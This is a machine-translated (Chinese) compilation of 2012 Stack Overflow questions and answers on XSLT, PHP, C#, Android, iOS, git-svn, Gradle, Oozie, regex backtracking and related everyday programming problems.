1.  如果数字是正数，我们使用该`floor()`函数。

2.  如果数字是负数，我们使用该`ceiling()`函数。

3.  我们使用以下事实将这两个函数（上面）结合起来，`number(true()) = 1`并且`number(false()) = 0`

**这是一个完整的例子**：

```
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
 <xsl:output method="text"/>
 <xsl:strip-space elements="*"/>

 <xsl:template match="text()">
  <xsl:value-of select="floor(.)*(. >= 0) + ceiling(.) * not(. >= 0)"/>
  <xsl:text>&#xA;</xsl:text>
 </xsl:template>
</xsl:stylesheet> 
```

**当此转换应用于以下 XML 文档时：**

```
<t>
 <a>2.34</a>
 <b>-3.14</b>
</t> 
```

**产生了想要的正确结果**：

```
2
-3 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-18T13:01:24.673

XPath[`floor()`](https://developer.mozilla.org/en-US/docs/XPath/Functions/floor)函数

> 计算一个十进制数并返回小于或等于该十进制数的最大整数

如果这些值都是正数并且 XPath 看起来像

```
<value111><xsl:value-of select="floor(number(.))"/></value111> 
```

`-2.1`但是，如果值为例如，它将不起作用，因为上面的代码会导致`-3`.

如果值可能为负数，则[`substring-before()`](https://developer.mozilla.org/en-US/docs/XPath/Functions/substring-before)如果只有一个小数点，则使用该函数将适用于正数和负数。

```
<value111><xsl:value-of select="substring-before(., '.')"/></value111> 
```

注意：不确定问题是否有错字，但其中一个模板的匹配模式不正确。它应该是

```
<xsl:template match="val1|sumval1"> 
```

代替

```
<xsl:template match="value1|sumval1"> 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-18T13:15:15.730

试试这个

```
<value111><xsl:value-of select="floor(number(.))"/></value111> 
```

# c# - 如何在 Windows 中识别工作站/进程？

> ID：12954602
> 
> 赞同：1
> 
> 时间：2012-10-18T12:25:01.137
> 
> 标签：c#, windows, pid

我的桌面应用程序将在网络中的多个 Windows 工作站上同时运行。该应用程序需要给自己一个 ID，该 ID 在网络中其他工作站上运行的应用程序的其他实例中唯一地标识自己。

应该使用什么来识别应用程序的每个实例？我应该使用机器名称和进程 ID 的组合吗？如果应用程序以非管理权限运行，是否可以从应用程序访问这些值？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-18T13:33:49.483

如果您想确保它们具有唯一的 ID，请使用 GUID，您可以在应用程序启动时生成它并向管理它的任何人报告。

您不需要管理员权限，它消除了计算机名称冲突的可能性，具体取决于网络的设置方式。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-18T12:41:26.297

可以限制权限，使 .net 无法访问机器名称，具体取决于机器上的 .net 安全设置

# php - ColdFusion和PHP在同一台电脑上，不同的环境

> ID：12954604
> 
> 赞同：0
> 
> 时间：2012-10-18T12:25:05.707
> 
> 标签：php, coldfusion, wamp

我目前有 CF 8，我也希望能够使用 PHP 代码，但在一个单独的环境中。我不希望 CF 和 PHP 代码混合。

我已经下载了 WAMP 以完成此操作，但我无法启动它（它只是任务栏中的橙色）。

为什么 WAMP 在橙色？在以前的安装中，我启动它，它变成绿色。这和CF有关系吗？当我去本地主机时，我去我的 CF 环境。如何访问 WAMP 本地主机？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-18T12:48:19.213

如果您真的担心，您可以使用虚拟机作为单独的环境 - 在这种情况下，这将是正常的安装过程。

但是，我想不出将它们安装在一起会导致问题的任何原因（我已经进行了许多设置，它们在 Linux 和具有 Apache 和 IIS 的 Windows 系统上并行运行）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-18T15:07:19.030

我曾经有同样的问题。我相信我所做的是将 CF 应用程序服务器设置为使用 Windows 作为服务手动启动。尝试禁用 CF，重新启动计算机，如果 WAMP 运行正常，您应该能够毫无问题地启动 CF。如果可行，您可能会延迟自动启动，以避免每次都必须手动执行。我通常不会同时在这两种环境中工作，所以无论如何它最终只会使用额外的资源。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-18T12:35:12.430

我的 Windows 开发机器和生产 Linux 服务器上运行着 ColdFusion 和 PHP。我也不记得这样做有很多麻烦。

在 StackOverLords 将此问题标记为过于宽泛之前，请尝试缩小问题的焦点，您将更有可能获得对您有帮助的答案。

# google-apps-script - 我无法让这个公式在目标单元格中 正常工作。我的公式符号有什么问题？

> ID：12954609
> 
> 赞同：1
> 
> 时间：2012-10-18T12:25:16.640
> 
> 标签：google-apps-script, google-sheets

我无法让这个公式在目标单元格中​​正常工作。我的公式符号有什么问题？

我试图使用下面的代码生成的有问题的公式应该如下所示**=importRange("0Ak-----------------------VkE5M2c","部落成员！A1:D172")**在目标单元格中​​。但它没有

```
 var source = SpreadsheetApp.getActiveSpreadsheet();
 var target = SpreadsheetApp.openById("0Ak-----------------------VkE5M2c");
 var insert_sheet = target.getSheetByName("Point Rank Sheet");
 var target_sheet = target.getSheetByName("clan members");
 var last_row = target_sheet.getLastRow();
 insert_sheet.insertRowAfter(last_row);     
 var values = source.getSheetByName("Form Data").getRange("A2:E2").getValues();
 target.getSheetByName("clan members").getRange("A"+(last_row+1)+":E"+(last_row+1)).setValues(values);
 var formula_cell = insert_sheet.getRange("A1:A1");
 var formula = '=importRange("0Ak-----------------------VkE5M2c","clan members!A1:D"+(last_row+1))';
 formula_cell.setFormula(formula) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-18T19:48:48.990

尝试：

`var formula = '=importRange("0Ak-----------------------VkE5M2c","clan members!A1:D' + (last_row + 1) + '")';`

# php - 为每个连接两个索引值

> ID：12954611
> 
> 赞同：-1
> 
> 时间：2012-10-18T12:25:25.183
> 
> 标签：php, arrays

我有一个这样的循环

```
$rr=array();

foreach($relations as $key=>$type){
  $rr[$relationType->U2U_Related_USR_ID]=$type[$k]->MSTT_Name.' / '.$type[$k+1]->MSTT_Name;
  $k++;
} 
```

我只得到第一个索引值。如何为每个连接两个索引值。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-18T12:28:44.350

增加**2**！

```
$rr = array();

for ($i = 0, $n = count($type); $i < $n; $i += 2) {
    $t1 = $type[$i];
    $t2 = $type[$i + 1];
    $rr[$relationType->U2U_Related_USR_ID] = $t1->MSTT_Name.' / '.$t2->MSTT_Name;
} 
```

**注意：** `$type`的长度应该是偶数！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-18T21:03:06.317

您可以在循环中使用 2 对键/值，如下所示：

```
foreach($relations as $key=>$type){

    list( $odd_key, $odd_value ) = each( $relations );

    //... your code here

    // This work with a step by 2 elements. If you need step by 1,
    // add the following line at the end of the loop :

    //prev( $relations )
} 
```

# iphone - 在 iPhone 中单击后退按钮加载 UItableView 及其数据

> ID：12954614
> 
> 赞同：1
> 
> 时间：2012-10-18T12:25:28.273
> 
> 标签：iphone, uitableview, xcode4

我有一个`UITableView`我正在加载`NSMutableArray`数据的数据。数据来自服务 url。现在，当我选择一个特定的时，我将它指向另一个包含详细数据的视图。我有一个导航`SecondViewController`栏和一个后退按钮。如果我点击它应该重新加载它已经加载的prevoius tableviews数据的按钮。但是现在当我这样做时，后退按钮正在工作并返回之前的视图，但我看不到其中的`UITableView`和数据..我不知道我哪里出错了......

这是代码..

```
-(IBAction)switchtofirst
{
FirstViewController *gp=[[FirstViewController alloc] initWithNibName:@"FirstViewController" bundle:nil];
 [gp.tableView reloadData];
[self presentModalViewController:gp animated:NO];
[gp release];

} 
```

我还需要做什么才能在 UITableView 中取回 UITableView 及其数据？

任何帮助，将不胜感激...

谢谢 ....

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-18T12:28:52.647

您不需要创建对象并编写这样的代码。

在 Back Btn Action 你只写

```
-(IBAction)switchtofirst
   {

    [self dismissModalViewControllerAnimated:YES];

   } 
```

试试这个

我希望它能正常工作

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-18T12:29:41.763

点击按钮只需使用以下代码。

```
 -(IBAction)switchtofirst
    {
     [self dismissModalViewControllerAnimated:YES];
    } 
```

# python - python中的字符串匹配不起作用

> ID：12954622
> 
> 赞同：0
> 
> 时间：2012-10-18T12:25:36.207
> 
> 标签：python, python-3.x, python-2.7

```
import subprocess

def volumeCheck(volume_name):
    """This function will check volume name is mounted or not.
    """
volume_name = raw_input('Enter volume name:')
volumeCheck(volume_name) 

p = subprocess.Popen(['df', '-h'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
p1, err = p.communicate()
pattern = p1

new_vol = '/VolumeData/' '+ volume_name +'

if pattern.find(new_vol) != -1 :

    print 'volume mounted'

else:
    print 'volume not mounted' 
```

**new_vol = '/VolumeData/' '+ volume_name +'**我认为这是错误的，但我该怎么做..？

我喜欢搜索 \volumeData\ volume_name 。

```
root@sr-query:/# df -h
Filesystem            Size  Used Avail Use% Mounted on
rootfs                938M  473M  418M  54% /
/dev/md0              938M  473M  418M  54% /
none                  250M  4.9M  245M   2% /dev
/dev/md2              9.7M  1.2M  8.0M  13% /usr/config
/dev/md7              961M   18M  895M   2% /downloads
tmpfs                 250M  7.9M  242M   4% /var/volatile
tmpfs                 250M     0  250M   0% /dev/shm
tmpfs                 250M     0  250M   0% /media/ram
/dev/mapper/vg9-lv9  1016M   65M  901M   7% /VolumeData/sp
/dev/mapper/vg10-lv10
                     1016M   65M  901M   7% /VolumeData/cp
root@sr-query:/# 
```

提前感谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-18T12:28:52.647

你到底要干什么？如果我理解正确，我可能会尝试`os.path.join`，例如：

```
new_vol = os.path.join('/','VolumeData', volume_name) 
```

* * *

此外，由于您实际上并未使用 的结果`find`，因此您可能需要考虑：

```
if new_vol in p1: 
```

反而。

# java - Java包找不到错误

> ID：12954624
> 
> 赞同：-2
> 
> 时间：2012-10-18T12:25:38.153
> 
> 标签：java, netbeans, packages

作为第一步，我尝试使用 net beans 7.2 在我的机器上运行一个 java 项目（安装的 JDK 版本是 5.5）。但是我遇到了一些错误。

```
 D:\InterfaceSnmpMaster.java:17:     package org.snmp4j.smi does not exist 
```

如果我是对的，我想我需要安装一些额外的东西来获得那个包。请帮我....

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-18T12:28:23.013

看来您正在尝试使用 SNMP4J。[从他们的站点](http://www.snmp4j.org/html/download.html)下载 .jar ，并将其添加到[类路径](http://docs.oracle.com/javase/6/docs/technotes/tools/windows/classpath.html)中，如[如何在 Netbeans 中设置类路径？](https://stackoverflow.com/questions/7598623/how-to-setup-classpath-in-netbeans)

> ```
> - Right-click your Project.
> - Select Properties.
> - On the left-hand side click Libraries.
> - Under Compile tab - click Add Jar/Folder button.
> Or
> - Expand you Project.
> - Right-click Libraries.
> - Select Add Jar/Folder. 
> ```

# import - 当我单击导入时，Lightroom 3.5 永远加载

> ID：12954625
> 
> 赞同：0
> 
> 时间：2012-10-18T12:25:43.603
> 
> 标签：import, osx-leopard, lightroom

我在 MacOS 10.6 上使用 lightroom 3.5，直到现在一切都很好。直到最近：如果我点击导入它将永远加载，如果我强制退出应用程序，我无法重新启动它，直到我关闭并重新启动我的 Imac。我尝试创建一个新目录，删除 .plist 首选项文件，当然还要重新安装软件而不做任何更改。有什么想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-19T08:36:54.093

我解决了我的问题：我在许多论坛上读到这可能是外部硬盘驱动器或紧凑型闪存阅读器（usb 设备......）的问题，这就是我弹出它们的原因：但这还不足以解决问题！您需要从物理上移除所有插入 USB 端口的设备，鼠标和键盘除外。您重新启动计算机和 lightroom。然后一切恢复正常。你可以插回你的外置硬盘

# android - 如何在android中播放dailymotion视频

> ID：12954626
> 
> 赞同：3
> 
> 时间：2012-10-18T12:25:44.367
> 
> 标签：android, webview, android-videoview, android-2.2-froyo

我是 android 的初学者。我在 android 2.2 中创建应用程序。我想在我的应用上播放第三方视频。我使用 webview 播放了 youtube 视频。我尝试在 webview 中播放 dailymotion 视频，它显示视频缩略图和播放图标。当我单击播放图标时，视频没有播放？请帮我 ...

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-05-07T08:42:54.363

请尝试此代码，

```
if (Build.VERSION.SDK_INT < 8) {
        contetView.getSettings().setPluginsEnabled(true);
    } else {
        contetView.getSettings().setPluginState(PluginState.ON);
    } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-05-07T08:33:41.750

在 Dailymotion 中获取视频的嵌入代码，并像这样为其分配 videoHtml；

```
 webView = (WebView) findViewById(R.id.webView1);
    videoHtml = "<iframe frameborder=\"0\" width=\"480\" height=\"270\" src=\"http://www.dailymotion.com/embed/video/xznb64\"></iframe><br /><a href=\"http://www.dailymotion.com/video/xznb64_leyla-ile-mecnun-dan-evlilik-programlarina-gonderme_news\" target=\"_blank\">Leyla İle Mecnun&#039;dan Evlilik Programlarına...</a> <i>ile  <a href=\"http://www.dailymotion.com/trthaber\" target=\"_blank\">trthaber</a></i>";
    webView.loadData(videoHtml, "text/html", "UTF-8");
    webView.getSettings().setLayoutAlgorithm(LayoutAlgorithm.SINGLE_COLUMN);
    webView.getSettings().setJavaScriptEnabled(true);
    webView.getSettings().setPluginsEnabled(true); 
```

# dns - 如何以编程方式找到新的可用域？

> ID：12954630
> 
> 赞同：3
> 
> 时间：2012-10-18T12:25:54.983
> 
> 标签：dns, scalability, domain-name

有用于发现新可用域的在线工具（即[http://www.swola.com/ ）。](http://www.swola.com/)

给定一个域名语料库，很容易定期检查它们的记录并在可用时发出标记。然而，定期检查世界上所有注册域名的记录听起来过度/不切实际。

以编程方式发现此类域的有效方法是什么？这些工具如何工作？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-18T20:47:38.810

我没有足够的数据经验来确定它的最新程度（例如，如果有人在到期前一周续订域，它从列表中删除的速度有多快？）但我发现 pool.com 有按到期日期排序的即将到来的域的数据库。创建一个下载此文件的 cron 作业，为您想要的特定域解析它是一件相对简单的事情（例如，明天到期的域，只有字符 az 的域，最多 9 个字符的域，其中包含*KEYWORD*的域， .coms 等）并通过电子邮件向您发送每日报告。

我想听到的一件事是其他人如何在这些域可用时立即订购它们。我知道一些注册商提供该服务，但通常费用很高。

[这是我的脚本](https://gist.github.com/3914495)，我在半小时内把它拼凑在一起，但希望它对你有用。

# codeigniter - 为什么我的 Codeigniter base_url () 配置在虚拟主机上不起作用？

> ID：12954635
> 
> 赞同：0
> 
> 时间：2012-10-18T12:26:10.603
> 
> 标签：codeigniter, web, web-hosting

我刚刚将我的 Ci 代码上传到网络托管 1and1.co.uk 并且 config.php 中的 base_url() 根本不起作用，它继续转到 localhost/blabala 而不是 www.example.com/

有人知道为什么会这样吗？我错过了什么？？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-18T12:28:33.817

**将其设置为**

```
 $config['base_url'] =''; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-18T12:30:33.240

改变

```
$config['base_url'] ='site url'
path application/config/config.php 
```

# hadoop - Oozie 协调器问题

> ID：12954638
> 
> 赞同：2
> 
> 时间：2012-10-18T12:26:19.177
> 
> 标签：hadoop, workflow, cloudera, oozie, oozie-coordinator

作为 cloudera 安装的一部分，我安装了 oozie。我正在尝试使用 coordinator.xml 中的以下配置执行示例中的协调器工作流。

```
<coordinator-app name="cron-coord" frequency="${coord:minutes(60)}" start="${start}" end="${end}" timezone="UTC" xmlns="uri:oozie:coordinator:0.2"> 
```

使用这种配置，我希望工作流每 1 小时执行一次，但似乎工作流每 5 分钟执行一次，有人回答这个问题吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-20T21:08:31.280

您是否将开始时间设置在当前时间之前？如果是这样，Oozie 将在追赶模式下工作，直到所有延迟的操作都已安排好。“频率”设置不适用于追赶模式。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-11-26T12:19:52.687

*您可以按小时*而不是*分钟*给出时间坐标：

```
coordinator-app name="cron-coord" frequency="${coord:hours(1)}" start="${start}" end="${end}" timezone="UTC" xmlns="uri:oozie:coordinator:0.2" 
```

# c# - 为什么这个电子邮件正则表达式在 Mvc 上这么慢？

> ID：12954639
> 
> 赞同：0
> 
> 时间：2012-10-18T12:26:21.807
> 
> 标签：c#, asp.net, regex, asp.net-mvc-2, email-validation

我目前正在使用 Asp.net、c#、Mvc2 构建一个系统，它使用以下正则表达式：

```
^([0-9a-zA-Z]([-.\w]*[0-9a-zA-Z])*@([0-9a-zA-Z][-\w]*[0-9a-zA-Z]\.)+[a-zA-Z]{2,9})$ 
```

这是一个验证“有效”电子邮件地址格式的电子邮件正则表达式。我的代码如下：

```
if (!Regex.IsMatch(model.Email, @"^([0-9a-zA-Z]([-.\w]*[0-9a-zA-Z])*@([0-9a-zA-Z][-\w]*[0-9a-zA-Z]\.)+[a-zA-Z]{2,9})$"))
                ModelState.AddModelError("Email", "The field Email is invalid."); 
```

正则表达式可以很好地验证电子邮件，但是如果将一个特别长的字符串传递给正则表达式并且它是无效的，它会导致系统继续“工作”而不解析页面。例如，这是我试图传递的数据：

```
iiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii 
```

上述字符串导致系统基本上锁定。我想知道为什么以及是否可以使用正则表达式以更简单的方式完成相同的事情。我的目标是不传递格式不正确的电子邮件地址，例如以下内容：

```
host.@.host..com 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-10-18T12:38:30.777

您有嵌套的重复运算符共享相同的字符，这很容易导致灾难性的回溯。

例如：`([-.\w]*[0-9a-zA-Z])*`

这表示：匹配 0 个或多个，`-._0-9a-zA-Z`后跟一个`0-9a-zA-Z`，一次或多次。

`i`属于这两个类别。

因此，当在`iiiiiiii...`正则表达式上运行时，匹配每个可能的排列`(several "i"s followed by one "i") several times`（这是很多排列）。

[通常，使用正则表达式验证电子邮件地址很困难。](https://stackoverflow.com/questions/201323/using-a-regular-expression-to-validate-an-email-address)

# git - 如何将 git 存储库与 svn 存储库重新连接？

> ID：12954644
> 
> 赞同：20
> 
> 时间：2012-10-18T12:26:31.090
> 
> 标签：git, svn

我曾经`git svn`将现有的 Subversion 存储库导入 git。然后我将它推送到 git 服务器上的 git repo。在过去的几个月里，Subversion 和 git 存储库都对软件进行了更改。不幸的是，我的本地副本与 svn 和 git 之间的链接已被删除。

我尝试再次使用重新创建本地副本`git svn`，但是当我从 git 服务器拉取时它会抱怨`warning: no common conflicts`，我最终会在开始时合并两个具有相同提交的单独分支。像这样：

```
F
|\
| \
E  D
|  |
C  C
|  |
B  B
|  |
A  A 
```

我怎样才能得到它来处理 svn 更改，就像它们发生在原始仓库的一个分支上一样？

```
F
|\
| \
E  D
| /
|/
C
|
B
|
A 
```

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2012-10-28T00:38:48.013

默认情况下`git-svn`，将 SVN 修订版和 Git 提交之间的映射存储在提交消息中。`git-svn-id`您是否在原始 Git 存储库中看到旧提交的这些行？这里我指的是托管在 Git 服务器上的 Git 存储库，而*不是*您最近从 SVN 获取的那个。

如果是这样，您实际上并没有丢失任何链接，并且 git-svn 应该能够从历史记录中恢复必要的数据。尽管由于不同版本的 git-svn 之间存在一些兼容性问题，这可能有点棘手：

1.  克隆您的原始 Git 存储库：

    ```
    $ git clone $GIT_SERVER repo
    $ cd repo 
    ```

2.  更新 .git/config 中的 git-svn 配置：

    ```
    $ git config svn-remote.svn.url $SVN_URL
    $ git config svn-remote.svn.fetch trunk:refs/remotes/trunk
    $ git config svn-remote.svn.branches branches/*:refs/remotes/*
    $ git config svn-remote.svn.tags tags/*:refs/remotes/tags/* 
    ```

3.  现在您必须使用 git-svn-id 行将 refs/remotes/* refs 更新为最新提交：

    ```
    $ git log --first-parent refs/heads/master
    commit d566edf5f77ae0a2f7418c40949757e75ef8e83c
    D

    commit 4df9f21346526c6505a954d8310637864710308d
    C
    git-svn-id: $SVN_URL .../trunk@3...

    commit 116a6760d3e278aa4d54f5bb22e531d30d731661
    B
    git-svn-id: $SVN_URL .../trunk@2...

    commit d8bb201c6fd55ea5e645f2d8a07248593d177910
    A
    git-svn-id: $SVN_URL .../trunk@1... 
    ```

    如您所见，提交 D 没有 git-svn-id 行，但提交 C 有一个，并且该行指的是主干，因此您必须更新 refs/remotes/trunk 以提交 C：

    ```
    $ git update-ref refs/remotes/trunk 4df9f21346526c6505a954d8310637864710308d 
    ```

4.  如果您有许多分支和标签，请针对我们上面指定的映射为它们重复相同的步骤：

    *   分支/foo => refs/remotes/foo

    *   tags/1.0 => refs/remotes/tags/1.0

5.  最后一步是恢复 .git/svn 目录中的映射：

    ```
    $ git svn fetch
    Migrating from a git-svn v1 layout...
    Data from a previous version of git-svn exists, but
        .git/svn
        (required for this version (X.Y.Z) of git-svn) does not exist.
    Done migrating from a git-svn v1 layout
    Rebuilding .git/svn/refs/remotes/trunk/.rev_map.694389ff-b137-4359-84f9-4d1a25628e89...
    r1 = d8bb201c6fd55ea5e645f2d8a07248593d177910
    r2 = 116a6760d3e278aa4d54f5bb22e531d30d731661
    r3 = 4df9f21346526c6505a954d8310637864710308d
    Done rebuilding .git/svn/refs/remotes/trunk/.rev_map.694389ff-b137-4359-84f9-4d1a25628e89 
    ```

最后一个命令还从 SVN 服务器获取新修订。命令完成后，您将拥有 Subversion 存储库的 git-svn 克隆。此存储库中的历史已经不同，因此您必须像往常一样在 SVN 和 Git 存储库之间同步更改：

```
$ git svn rebase
$ git svn dcommit 
```

希望有帮助。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-10-21T12:06:45.657

首先，我会检查`git svn info`命令的输出。你在那里看到一些奇怪的东西吗？

`git svn`其次，与本地存储库以外的辅助 git 存储库一起使用并不是一个好主意。

原因是在每个`git svn dcommit`git 自动**重写**您之前所做的所有提交之后：首先它将它们提交回 svn，然后添加提交的 svn 修订号（在一个名为 的唯一标识符中`git-svn-id`）。

在您创建新的存储库中应该是这样的`dcommit`：

```
$ git log -1
commit 1234abc...
Author: ...
Date:   ...

Some commit message

git-svn-id: http://your.svn.repo/svn/trunk@10 1234abc 
```

关于细节，这里是[ProGit book 中的一个部分](http://git-scm.com/book/en/Git-and-Other-Systems-Git-and-Subversion)。

您写的错误消息可能是`warning: no common commits`（不是`conflicts`您在问题中写的），我的印象是 git 没有将这些元数据推送到远程仓库中。

我认为你可以从死里复活这个 SVN 链接，但要小心，将它放在 repo 的单独克隆上，并仔细阅读文档以了解它需要哪些元数据。在 git 中，您可以使用管道工具做很多事情，看看它们。

顺便说一句，你不能简单地克隆远程 git repo 并使用它吗？

希望这会有所帮助，或者至少给您一些可以开始寻找解决方案的想法。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-23T09:28:04.377

从提交图

```
F
|\
| \
E   D
|   |
C1  C2
|   |
B1  B2
|   |
A1  A2 
```

使用以下命令

```
git checkout <SHA1-B1>
git checkout -b new
git cherry-pick <SHA1-C2> <SHA1-D>
git checkout <SHA1-F>
git checkout -b position_f
git merge new 
```

完毕。反正我还没试过。首先备份您的存储库。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-10-23T18:17:11.077

最简单的解决方案是将本地 git-svn 分支推送到 git 服务器，如下所示：

`git push <git-server> <branch-name>:<branch-name>`

它将用您的本地分支覆盖 git-server 分支。

仅当您确定 git-svn 分支具有 git 服务器具有的所有提交时才这样做。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-10-26T22:19:26.867

这个怎么样：

*   备份！
*   将 svn 历史重新导入 git
*   将旧分支和新分支放到同一个仓库中
*   将分支倒回到之前的提交`F`
*   重新设置分支中的所有更改，因为您`C`在新导入的 svn 之上`C`
*   重新尝试合并

如果这不起作用，您可以尝试[Git replace](https://www.kernel.org/pub/software/scm/git/docs/git-replace.html)，但这可能不是一个好主意。

# android - Android 在暂停时销毁位图

> ID：12954646
> 
> 赞同：0
> 
> 时间：2012-10-18T12:26:36.127
> 
> 标签：android, memory-management, bitmap, onpause

我有一个使用 4 个位图的游戏。我只是想知道我是否应该在游戏暂停时销毁这些位图然后重新创建它们，还是保持原样？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-18T12:33:19.480

不，最好使用一些将这些位图作为静态变量保存的类。

# groovy - 创建要由多个子项目使用的根级 gradle 任务？

> ID：12954650
> 
> 赞同：0
> 
> 时间：2012-10-18T12:26:40.720
> 
> 标签：groovy, gradle, tar

我想在我的根项目中创建一个任务，该任务将为某些子项目创建一个自定义 TAR。

```
task archive(type: Tar) {
    project.logger.info("Tar bundle :: ")
    baseName = project.baseName
    destinationDir = new File(project.buildDir.path)
    archiveDir = new File(project.buildDir.path)
    compression = Compression.GZIP
    from (archiveDir)
} 
```

我找到了这个任务，但我需要的是一个子项目来发送 subproject.name 并让任务使用 buildDir 和来自调用任务的子项目的源目录。然后将存档也保存到子项目的 /target 中。

如果不为每个子项目创建新任务，这是否可能？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-18T12:48:53.097

如果每个子项目都应该创建自己的 Tar，那么您需要为每个子项目创建一个任务。这就像将任务声明包装在`subprojects { ... }`. 您还必须`project.`从代码中删除所有出现的 ，以及整`baseName`行。（无论如何，所有这些都是多余的。）

`new File(project.buildDir.path)`是一样的`buildDir`。而不是`logger.info("Tar bundle :: ")`，你可能想要`doFirst { logger.info("Tar bundle :: ") }`。否则，无论执行哪些任务，都会为每个构建记录此消息。

# ruby-on-rails - 来自哪个宝石的例外

> ID：12954652
> 
> 赞同：0
> 
> 时间：2012-10-18T12:26:56.597
> 
> 标签：ruby-on-rails, exception, logging

我想要一个 rails 3.2 应用程序来记录哪个 gem 拥有代码，发生异常的地方。

是否可以？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-18T12:37:55.950

可以通过 $ERROR_INFO.caller 打印出执行堆栈，找出异常发生的位置。

# php - 访问 $_POST 或另一个超全局时是否可能触发错误？

> ID：12954656
> 
> 赞同：5
> 
> 时间：2012-10-18T12:27:01.773
> 
> 标签：php, superglobals

我有这个框架项目，我想强制使用一个`Input`类来访问所有超全局变量，比如`$_POST`,`$_GET`和`$_SERVER`. 最近的一个[问题](https://stackoverflow.com/questions/12953917/clearing-post-array-fully)让我想起了它。

该课程将对[密钥进行一些清理，](https://stackoverflow.com/questions/10559482/how-are-input-keys-exploitable-by-malicious-users)以确保没有恶意或意外，并提供一种访问项目的方法，而无需`isset()`每次都使用。它可能会根据配置执行其他操作，并且可能还会清除超全局变量。我也不喜欢[超全局变量不是只读的](https://softwareengineering.stackexchange.com/questions/76406/directly-modifying-superglobals)这一事实，我想在值中强制执行完整性。我希望这个类被独占使用，并希望在不使用时警告开发人员。

我的问题是这样的，我担心答案是“不”：

访问超全局变量之一时是否可以[触发错误](http://www.php.net/manual/en/function.trigger-error.php)？例如：

```
$myvar = $_POST['key'];
// Prints "Error: POST cannot be accessed directly, use the Input class instead" 
```

或者写信给超全球？：

```
$_POST['key'] = 'myvalue';
// Prints "Error: POST data cannot be modified" 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-10-18T12:41:41.057

将对象分配给 $_POST 变量并使用魔术方法怎么样？

$_POST = new %your-class%();

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-10-18T13:03:18.493

您可以使用`ArrayAccess`

示例 1：

```
$_POST = new SUPER($_POST);
$_POST['hello'] = "Hello World"; // This would trigger error ; 
```

示例 2：`a.php?var=1&var2=2`

```
$_GET = new SUPER($_GET);
echo $_GET['var'] ; // returns 1
echo $_GET['var2'] ; // returns 2

$_GET['var3'] = 2 ; //return error 
```

使用的类

```
class SUPER implements \ArrayAccess {
    private $request = array();

    public function __construct(array $array) {
        $this->request = $array;
    }

    public function setRequest(array $array) {
        $this->request = $array;
    }

    public function offsetSet($offset, $value) {
        trigger_error("Error: SUPER GLOBAL data cannot be modified");
    }

    public function offsetExists($offset) {
        return isset($this->request[$offset]);
    }

    public function offsetUnset($offset) {
        unset($this->request[$offset]);
    }

    public function offsetGet($offset) {
        return isset($this->request[$offset]) ? $this->request[$offset] : null;
    }
} 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-10-18T12:45:12.850

它只会触发通知，但如果您首先将所有超全局键/值复制到对象中，然后执行以下操作：

```
unset($_GET,$_POST,$_SERVER); 
```

之后，对这些超全局变量的任何读取访问都将失败。要禁止写入，您可以在这些变量上实例化您选择的对象（即名称为 $_GET、$_POST、$_SERVER）。为了让这些通过 [$key] 数组操作符可访问，它们应该是实现[ArrayAccess](http://www.php.net/manual/en/class.arrayaccess.php)接口的对象的实例。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-10-18T20:54:54.347

这基本上是@Baba 已经展示的内容，但我一直在为一些项目使用类似的输入包装器。它非常适合小型项目，但不可否认，我仍然必须克服使用不情愿。但是，它肯定会简化清理和审核。

[http://sourceforge.net/p/php7framework/svn/66/tree/trunk/php7/input.php?force=True](http://sourceforge.net/p/php7framework/svn/66/tree/trunk/php7/input.php?force=True)
[http://sourceforge.net/p/php7framework/wiki/input/](http://sourceforge.net/p/php7framework/wiki/input/)

该`ArrayAccess`方法就是您所需要的。在运行时防止输入注入或覆盖`offsetSet`就足够了。虽然我只是打印通知，但仍然允许它。

然而，基本上它是用于消毒的。例如，对 eg 的任何原始访问都`$_REQUEST["key"]`将通过默认过滤器，但您也可以在运行时简单地调用各种过滤器链：

```
 print $_POST->html->text["comment"]; 
```

最近我一直在允许一个受限制的 register_globals workaorund，一次本地化多个变量。使用 PHP 5.4 语法看起来很有趣：

```
 extract( $_REQUEST->list->text[[ title, id, email ]] );
 // implicit undef-constant notices here ^^ of course 
```

